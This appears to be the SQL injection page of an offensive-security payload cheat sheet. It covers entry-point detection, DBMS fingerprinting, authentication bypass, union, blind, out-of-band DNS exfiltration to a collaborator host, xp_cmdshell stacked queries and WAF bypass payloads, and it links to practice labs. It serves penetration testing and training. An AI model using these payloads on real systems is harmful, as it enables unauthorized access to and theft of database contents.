# sql injection

> sql injection (sqli)  is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. sql injection is one of the most common and severe types of web application vulnerabilities, enabling attackers to execute arbitrary sql code on the database. this can lead to unauthorized data access, data manipulation, and, in some cases, full compromise of the database server.


## summary

* [cheatsheets](#cheatsheets)
    * [mssql injection](https://github.com/swisskyrepo/payloadsallthethings/blob/master/sql%20injection/mssql%20injection.md)
    * [mysql injection](https://github.com/swisskyrepo/payloadsallthethings/blob/master/sql%20injection/mysql%20injection.md)
    * [oraclesql injection](https://github.com/swisskyrepo/payloadsallthethings/blob/master/sql%20injection/oraclesql%20injection.md)
    * [postgresql injection](https://github.com/swisskyrepo/payloadsallthethings/blob/master/sql%20injection/postgresql%20injection.md)
    * [sqlite injection](https://github.com/swisskyrepo/payloadsallthethings/blob/master/sql%20injection/sqlite%20injection.md)
    * [cassandra injection](https://github.com/swisskyrepo/payloadsallthethings/blob/master/sql%20injection/cassandra%20injection.md)
    * [db2 injection](https://github.com/swisskyrepo/payloadsallthethings/blob/master/sql%20injection/db2%20injection.md)
    * [sqlmap](https://github.com/swisskyrepo/payloadsallthethings/blob/master/sql%20injection/sqlmap.md)
* [tools](#tools)
* [entry point detection](#entry-point-detection)
* [dbms identification](#dbms-identification)
* [authentication bypass](#authentication-bypass)
    * [raw md5 and sha1](#raw-md5-and-sha1)
* [union based injection](#union-based-injection)
* [error based injection](#error-based-injection)
* [blind injection](#blind-injection)
    * [boolean based injection](#boolean-based-injection)
    * [blind error based injection](#blind-error-based-injection)
    * [time based injection](#time-based-injection)
    * [out of band (oast)](#out-of-band-oast)
* [stack based injection](#stack-based-injection)
* [polyglot injection](#polyglot-injection)
* [routed injection](#routed-injection)
* [second order sql injection](#second-order-sql-injection)
* [generic waf bypass](#generic-waf-bypass)
    * [white spaces](#white-spaces)
    * [no comma allowed](#no-comma-allowed)
    * [no equal allowed](#no-equal-allowed)
    * [case modification](#case-modification)
* [labs](#labs)
* [references](#references)


## tools

* [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) - automatic sql injection and database takeover tool
* [r0oth3x49/ghauri](https://github.com/r0oth3x49/ghauri) - an advanced cross-platform tool that automates the process of detecting and exploiting sql injection security flaws


## entry point detection

detecting the entry point in sql injection (sqli) involves identifying locations in an application where user input is not properly sanitized before it is included in sql queries.

* **error messages**: inputting special characters (e.g., a single quote ') into input fields might trigger sql errors. if the application displays detailed error messages, it can indicate a potential sql injection point.
    * simple characters: `'`, `"`, `;`, `)` and `*`
    * simple characters encoded: `%27`, `%22`, `%23`, `%3b`, `%29` and `%2a`
    * multiple encoding: `%%2727`, `%25%27`
    * unicode characters: `u+02ba`, `u+02b9`
        * modifier letter double prime (`u+02ba` encoded as `%ca%ba`) is transformed into `u+0022` quotation mark (`)
        * modifier letter prime (`u+02b9` encoded as `%ca%b9`) is transformed into `u+0027` apostrophe (')

* **tautology-based sql injection**: by inputting tautological (always true) conditions, you can test for vulnerabilities. for instance, entering `admin' or '1'='1` in a username field might log you in as the admin if the system is vulnerable.
    * merging characters
      ```sql
      `+herp
      '||'derp
      '+'herp
      ' 'derp
      '%20'herp
      '%2b'herp
      ```
    * logic testing
      ```sql
      page.asp?id=1 or 1=1 -- true
      page.asp?id=1' or 1=1 -- true
      page.asp?id=1" or 1=1 -- true
      page.asp?id=1 and 1=2 -- false
      ```

* **timing attacks**: inputting sql commands that cause deliberate delays (e.g., using `sleep` or `benchmark` functions in mysql) can help identify potential injection points. if the application takes an unusually long time to respond after such input, it might be vulnerable.


## dbms identification

### dbms identification keyword based

certain sql keywords are specific to particular database management systems (dbms). by using these keywords in sql injection attempts and observing how the website responds, you can often determine the type of dbms in use.

| dbms                | sql payload                     |
| ------------------- | ------------------------------- |
| mysql               | `conv('a',16,2)=conv('a',16,2)` |
| mysql               | `connection_id()=connection_id()` |
| mysql               | `crc32('mysql')=crc32('mysql')` |
| mssql               | `binary_checksum(123)=binary_checksum(123)` |
| mssql               | `@@connections>0` |
| mssql               | `@@connections=@@connections` |
| mssql               | `@@cpu_busy=@@cpu_busy` |
| mssql               | `user_id(1)=user_id(1)` |
| oracle              | `rownum=rownum` |
| oracle              | `rawtohex('ab')=rawtohex('ab')` |
| oracle              | `lnnvl(0=123)` |
| postgresql          | `5::int=5` |
| postgresql          | `5::integer=5` |
| postgresql          | `pg_client_encoding()=pg_client_encoding()` |
| postgresql          | `get_current_ts_config()=get_current_ts_config()` |
| postgresql          | `quote_literal(42.5)=quote_literal(42.5)` |
| postgresql          | `current_database()=current_database()` |
| sqlite              | `sqlite_version()=sqlite_version()` |
| sqlite              | `last_insert_rowid()>1` |
| sqlite              | `last_insert_rowid()=last_insert_rowid()` |
| msaccess            | `val(cvar(1))=1` |
| msaccess            | `iif(atn(2)>0,1,0) between 2 and 0` |


### dbms identification error based

different dbmss return distinct error messages when they encounter issues. by triggering errors and examining the specific messages sent back by the database, you can often identify the type of dbms the website is using.

| dbms                | example error message                                                                    | example payload |
| ------------------- | -----------------------------------------------------------------------------------------|-----------------|
| mysql               | `you have an error in your sql syntax; ... near '' at line 1`                            | `'`             |
| postgresql          | `error: unterminated quoted string at or near "'"`                                       | `'`             |
| postgresql          | `error: syntax error at or near "1"`                                                     | `1'`            |
| microsoft sql server| `unclosed quotation mark after the character string ''.`                                 | `'`             |
| microsoft sql server| `incorrect syntax near ''.`                                                              | `'`             |
| microsoft sql server| `the conversion of the varchar value to data type int resulted in an out-of-range value.`| `1'`            |
| oracle              | `ora-00933: sql command not properly ended`                                              | `'`             |
| oracle              | `ora-01756: quoted string not properly terminated`                                       | `'`             |
| oracle              | `ora-00923: from keyword not found where expected`                                       | `1'`            |



## authentication bypass

in a standard authentication mechanism, users provide a username and password. the application typically checks these credentials against a database. for example, a sql query might look something like this: 

```sql
select * from users where username = 'user' and password = 'pass';
```

an attacker can attempt to inject malicious sql code into the username or password fields. for instance, if the attacker types the following in the username field:

```sql
' or '1'='1
```

and leaves the password field empty, the resulting sql query executed might look like this:

```sql
select * from users where username = '' or '1'='1' and password = '';
```

here, `'1'='1'` is always true, which means the query could return a valid user, effectively bypassing the authentication check.

:warning: in this case, the database will return an array of results because it will match every users in the table. this will produce an error in the server side since it was expecting only one result. by adding a `limit` clause, you can restrict the number of rows returned by the query. by submitting the following payload in the username field, you will log in as the first user in the database. additionally, you can inject a payload in the password field while using the correct username to target a specific user. 

```sql
' or 1=1 limit 1 --
```

:warning: avoid using this payload indiscriminately, as it always returns true. it could interact with endpoints that may inadvertently delete sessions, files, configurations, or database data.

* [payloadsallthethings/sql injection/intruder/auth_bypass.txt](https://github.com/swisskyrepo/payloadsallthethings/blob/master/sql%20injection/intruder/auth_bypass.txt)


### raw md5 and sha1

in php, if the optional `binary` parameter is set to true, then the `md5` digest is instead returned in raw binary format with a length of 16. let's take this php code where the authentication is checking the md5 hash of the password submitted by the user.

```php
sql = "select * from admin where pass = '".md5($password,true)."'";
```

an attacker can craft a payload where the result of the `md5($password,true)` function will contain a quote and escape the sql context, for example with `' or 'something`.


| hash | input    | output (raw)            |  payload  |
| ---- | -------- | ----------------------- | --------- |
| md5  | ffifdyop | `'or'6�]��!r,��b`       | `'or'`    |
| md5  | 129581926211651571912466741651878684928 | `út0do#ßá'or'8` | `'or'` |
| sha1 | 3fdf     | `q�u'='�@�[�t�- o��_-!` | `'='`     |
| sha1 | 178374   | `üû¾}_ia!8wm'/*´õ`      | `'/*`     |
| sha1 | 17       | `ùp2ûjww%6\`            | `\`       |

this behavior can be abused to bypass the authentication by escaping the context.

```php
sql1 = "select * from admin where pass = '".md5("ffifdyop", true)."'";
sql1 = "select * from admin where pass = ''or'6�]��!r,��b'";
```


## union based injection

in a standard sql query, data is retrieved from one table. the `union` operator allows multiple `select` statements to be combined. if an application is vulnerable to sql injection, an attacker can inject a crafted sql query that appends a `union` statement to the original query.

let's assume a vulnerable web application retrieves product details based on a product id from a database: 

```sql
select product_name, product_price from products where product_id = 'input_id';
```

an attacker could modify the `input_id` to include the data from another table like `users`.

```sql
1' union select username, password from users --
```

after submitting our payload, the query become the following sql:

```sql
select product_name, product_price from products where product_id = '1' union select username, password from users --';
```

:warning: the 2 select clauses must have the same number of columns.


## error based injection

error-based sql injection is a technique that relies on the error messages returned from the database to gather information about the database structure. by manipulating the input parameters of an sql query, an attacker can make the database generate error messages. these errors can reveal critical details about the database, such as table names, column names, and data types, which can be used to craft further attacks.

for example, on a postgresql, injecting this payload in a sql query would result in an error since the limit clause is expecting a numeric value.

```sql
limit cast((select version()) as numeric) 
```

the error will leak the output of the `version()`.

```ps1
error: invalid input syntax for type numeric: "postgresql 9.5.25 on x86_64-pc-linux-gnu"
```


## blind injection

blind sql injection is a type of sql injection attack that asks the database true or false questions and determines the answer based on the application's response. 


### boolean based injection

attacks rely on sending an sql query to the database, making the application return a different result depending on whether the query returns true or false. the attacker can infer information based on differences in the behavior of the application.

size of the page, http response code, or missing parts of the page are strong indicators to detect whether the boolean-based blind sql injection was successful.

here is a naive example to recover the content of the `@@hostname` variable.

**identify injection point and confirm vulnerability** : inject a payload that evaluates to true/false to confirm sql injection vulnerability. for example: 

```ps1
http://example.com/item?id=1 and 1=1 -- (expected: normal response)
http://example.com/item?id=1 and 1=2 -- (expected: different response or error)
```
 
**extract hostname length**: guess the length of the hostname by incrementing until the response indicates a match. for example: 

```ps1
http://example.com/item?id=1 and length(@@hostname)=1 -- (expected: no change)
http://example.com/item?id=1 and length(@@hostname)=2 -- (expected: no change)
http://example.com/item?id=1 and length(@@hostname)=n -- (expected: change in response)
```

**extract hostname characters** : extract each character of the hostname using substring and ascii comparison: 

```ps1
http://example.com/item?id=1 and ascii(substring(@@hostname, 1, 1)) > 64 -- 
http://example.com/item?id=1 and ascii(substring(@@hostname, 1, 1)) = 104 -- 
```
 
then repeat the method to discover every characters of the `@@hostname`. obviously this example is not the fastest way to obtain them. here are a few pointers to speed it up:

- extract characters using dichotomy: it reduces the number of requests from linear to logarithmic time, making data extraction much more efficient. 


### blind error based injection

attacks rely on sending an sql query to the database, making the application return a different result depending on whether the query returned successfully or triggered an error. in this case, we only infer the success from the server's answer, but the data is not extracted from output of the error.


**example**: using `json()` function in sqlite to trigger an error as an oracle to know when the injection is true or false.

```sql
' and case when 1=1 then 1 else json('') end and 'a'='a -- ok
' and case when 1=2 then 1 else json('') end and 'a'='a -- malformed json
```


### time based injection

time-based sql injection is a type of blind sql injection attack that relies on database delays to infer whether certain queries return true or false. it is used when an application does not display any direct feedback from the database queries but allows execution of time-delayed sql commands. the attacker can analyze the time it takes for the database to respond to indirectly gather information from the database.

* default `sleep` function for the database

```sql
' and sleep(5)/*
' and '1'='1' and sleep(5)
' ; waitfor delay '00:00:05' --
```

* heavy queries that take a lot of time to complete, usually crypto functions.

```sql
benchmark(2000000,md5(now()))
```

let's see a basic example to recover the version of the database using a time based sql injection.

```sql
http://example.com/item?id=1 and if(substring(version(), 1, 1) = '5', benchmark(1000000, md5(1)), 0) --
```

if the server's response is taking a few seconds before getting received, then the version is starting is by '5'.


### out of band (oast)

out-of-band sql injection (oob sqli) occurs when an attacker uses alternative communication channels to exfiltrate data from a database. unlike traditional sql injection techniques that rely on immediate responses within the http response, oob sql injection depends on the database server's ability to make network connections to an attacker-controlled server. this method is particularly useful when the injected sql command's results cannot be seen directly or the server's responses are not stable or reliable. 

different databases offer various methods for creating out-of-band connections, the most common technique is the dns exfiltration: 

* mysql

  ```sql
  load_file('\\\\burp-collaborator-subdomain\\a')
  select ... into outfile '\\\\burp-collaborator-subdomain\a'
  ```

* mssql

  ```sql
  select utl_inaddr.get_host_address('burp-collaborator-subdomain')
  exec master..xp_dirtree '//burp-collaborator-subdomain/a'
  ```


## stacked based injection

stacked queries sql injection is a technique where multiple sql statements are executed in a single query, separated by a delimiter such as a semicolon (`;`). this allows an attacker to execute additional malicious sql commands following a legitimate query. not all databases or application configurations support stacked queries.

```sql
1; exec xp_cmdshell('whoami') --
```


## polyglot injection

a polygot sql injection payload is a specially crafted sql injection attack string that can successfully execute in multiple contexts or environments without modification. this means that the payload can bypass different types of validation, parsing, or execution logic in a web application or database by being valid sql in various scenarios.

```sql
sleep(1) /*' or sleep(1) or '" or sleep(1) or "*/
```


## routed injection

> routed sql injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. - zenodermus javanicus

in short, the result of the first sql query is used to build the second sql query. the usual format is `' union select 0xhexvalue --` where the hex is the sql injection for the second query.

**example 1**:

`0x2720756e696f6e2073656c65637420312c3223` is the hex encoded of `' union select 1,2#`

```sql
' union select 0x2720756e696f6e2073656c65637420312c3223#
```

**example 2**:

`0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061` is the hex encoded of `-1' union select login,password from users-- a`.

```sql
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```


## second order sql injection

second order sql injection is a subtype of sql injection where the malicious sql payload is primarily stored in the application's database and later executed by a different functionality of the same application.

```py
username="anything' union select username, password from users;--"
password="p@ssw0rd"
```

since you are inserting your payload in the database for a later use, any other type of injections can be used union, error, blind, stacked, etc.


## generic waf bypass

### white spaces

bypass using whitespace alternatives.

| bypass                   | technique              |
| ------------------------ | ---------------------- |
| `?id=1%09and%091=1%09--` | whitespace alternative |
| `?id=1%0aand%0a1=1%0a--` | whitespace alternative |
| `?id=1%0band%0b1=1%0b--` | whitespace alternative |
| `?id=1%0cand%0c1=1%0c--` | whitespace alternative |
| `?id=1%0dand%0d1=1%0d--` | whitespace alternative |
| `?id=1%a0and%a01=1%a0--` | whitespace alternative |
| `?id=1%a0and%a01=1%a0--` | whitespace alternative |

| dbms       | ascii characters in hexadecimal |
| ---------- | ------------------------------- |
| sqlite3    | 0a, 0d, 0c, 09, 20 |
| mysql	5    | 09, 0a, 0b, 0c, 0d, a0, 20 |
| mysql	3	   | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0a, 0b, 0c, 0d, 0e, 0f, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1a, 1b, 1c, 1d, 1e, 1f, 20, 7f, 80, 81, 88, 8d, 8f, 90, 98, 9d, a0 |
| postgresql | 0a, 0d, 0c, 09, 20 |
| oracle 11g | 00, 0a, 0d, 0c, 09, 20 |
| mssql      | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0a, 0b, 0c, 0d, 0e, 0f, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1a, 1b, 1c, 1d, 1e, 1f, 20 |


bypass using comments and parenthesis.

| bypass                                    | technique            |
| ----------------------------------------- | -------------------- |
| `?id=1/*comment*/and/**/1=1/**/--`        | comment              |
| `?id=1/*!12345union*//*!12345select*/1--` | conditional comment  |
| `?id=(1)and(1)=(1)--`                     | parenthesis          |

 
### no comma allowed
 
bypass using `offset`, `from` and `join`.

| forbidden           | bypass |
| ------------------- | ------ |
| `limit 0,1`         | `limit 1 offset 0` |
| `substr('sql',1,1)` | `substr('sql' from 1 for 1)` |
| `select 1,2,3,4`    | `union select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d` |


### no equal allowed

bypass using like/not in/in/between


| bypass    | sql example |
| --------- | ------------------------------------------ |
| `like`    | `substring(version(),1,1)like(5)`          |
| `not in`  | `substring(version(),1,1)not in(4,3)`      |
| `in`      | `substring(version(),1,1)in(4,3)`          |
| `between` | `substring(version(),1,1) between 3 and 4` |


### case modification

bypass using uppercase/lowercase.

| bypass    | technique  |
| --------- | ---------- |
| `and`     | uppercase  |
| `and`     | lowercase  |
| `and`     | mixed case |


bypass using keywords case insensitive or an equivalent operator.

| forbidden | bypass                      |
| --------- | --------------------------- |
| `and`     | `&&`                        |
| `or`      | `\|\|`                      |
| `=`       | `like`, `regexp`, `between` |
| `>`       | `not between 0 and x`       |
| `where`   | `having`                    |


## labs 

* [portswigger - sql injection vulnerability in where clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
* [portswigger - sql injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
* [portswigger - sql injection with filter bypass via xml encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
* [portswigger - sql labs](https://portswigger.net/web-security/all-labs#sql-injection)
* [root me - sql injection - authentication](https://www.root-me.org/en/challenges/web-server/sql-injection-authentication)
* [root me - sql injection - authentication - gbk](https://www.root-me.org/en/challenges/web-server/sql-injection-authentication-gbk)
* [root me - sql injection - string](https://www.root-me.org/en/challenges/web-server/sql-injection-string)
* [root me - sql injection - numeric](https://www.root-me.org/en/challenges/web-server/sql-injection-numeric)
* [root me - sql injection - routed](https://www.root-me.org/en/challenges/web-server/sql-injection-routed)
* [root me - sql injection - error](https://www.root-me.org/en/challenges/web-server/sql-injection-error)
* [root me - sql injection - insert](https://www.root-me.org/en/challenges/web-server/sql-injection-insert)
* [root me - sql injection - file reading](https://www.root-me.org/en/challenges/web-server/sql-injection-file-reading)
* [root me - sql injection - time based](https://www.root-me.org/en/challenges/web-server/sql-injection-time-based)
* [root me - sql injection - blind](https://www.root-me.org/en/challenges/web-server/sql-injection-blind)
* [root me - sql injection - second order](https://www.root-me.org/en/challenges/web-server/sql-injection-second-order)
* [root me - sql injection - filter bypass](https://www.root-me.org/en/challenges/web-server/sql-injection-filter-bypass)
* [root me - sql truncation](https://www.root-me.org/en/challenges/web-server/sql-truncation)


## references

* [analyzing cve-2018-6376 – joomla!, second order sql injection - not so secure - february 9, 2018](https://web.archive.org/web/20180209143119/https://www.notsosecure.com/analyzing-cve-2018-6376/)
* [implement a blind error-based sqlmap payload for sqlite - soka - august 24, 2023](https://sokarepo.github.io/web/2023/08/24/implement-blind-sqlite-sqlmap.html)
* [manual sql injection discovery tips - gerben javado - august 26, 2017](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
* [netspi sql injection wiki - netspi - december 21, 2017](https://sqlwiki.netspi.com/)
* [pentestmonkey's mysql injection cheat sheet - @pentestmonkey - august 15, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
* [sqli cheatsheet - netsparker - march 19, 2022](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
* [sqli in insert worse than select - mathias karlsson - feb 14, 2017](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
* [sqli optimization and obfuscation techniques - roberto salgado - 2013](https://web.archive.org/web/20221005232819/https://paper.bobylive.com/meeting_papers/blackhat/usa-2013/us-13-salgado-sqli-optimization-and-obfuscation-techniques-slides.pdf)
* [the sql injection knowledge base - roberto salgado - may 29, 2013](https://websec.ca/kb/sql_injection)
